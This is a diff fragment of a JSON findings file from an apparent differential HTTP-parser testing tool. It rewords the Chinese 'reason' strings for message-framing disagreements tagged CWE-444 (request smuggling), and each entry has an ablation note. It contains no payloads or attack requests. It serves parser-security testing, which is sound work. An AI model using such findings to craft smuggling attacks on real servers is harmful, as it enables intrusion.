-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -1903,7 +2233,7 @@
       "right": "ref-loose-request-line",
       "level": "unknown",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），但消融实验无法定位到单条可控头 → 需人工复核",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），但消融实验无法定位到单条可控承载者 → 需人工复核",
       "controllable": false,
       "ablation": null,
       "cwe": "CWE-444",
@@ -1985,7 +2315,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -2063,7 +2393,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -2141,7 +2471,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -2219,7 +2549,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed', 'leftover_len']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -2305,7 +2635,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -2387,7 +2717,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -2469,7 +2799,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'cl', 'body_len', 'consumed']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
@@ -2551,7 +2881,7 @@
       "right": "ref-loose-request-line",
       "level": "security",
       "kind": "framing_boundary",
-      "reason": "消息边界解释分歧（字段 ['accepted', 'status', 'framing_source', 'te', 'body_len', 'consumed']），且由攻击者可直接发送的部分（请求行/请求头）承载 → 具备请求走私的结构性前提",
+      "reason": "结构字段分歧（['accepted', 'status', 'framing_source', 'te', 'body_len', 'consumed']），且消融实验证明它由攻击者可直接发送的字节承载 → 具备可升级为安全影响的结构性前提；具体后果与 CWE 见领域映射（CWE-444）",
       "controllable": true,
       "ablation": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "cwe": "CWE-444",
